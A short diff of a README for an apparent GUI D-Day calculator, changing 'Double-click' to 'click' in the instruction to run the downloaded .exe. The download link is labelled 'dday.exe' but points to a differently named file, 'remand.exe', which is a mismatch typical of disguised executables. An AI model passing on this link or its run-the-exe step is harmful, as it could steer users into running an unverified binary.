@@ -17,7 +17,7 @@ I am incredibly excited to officially share my GUI-based D-Day Calculator with t
 
 ### 1. For General Users (Recommended!)
 1. Click **[👉 Download dday.exe 📥](https://github.com/loveisworld732-del/advanced-d-day-calculator/releases/latest/download/remand.exe)** to download the application directly.
-2. Double-click the downloaded `.exe` file to run it. No Python installation required!
+2. click the downloaded `.exe` file to run it. No Python installation required!
 
 #### 2. For Developers (Source Code Execution)
 ```bash
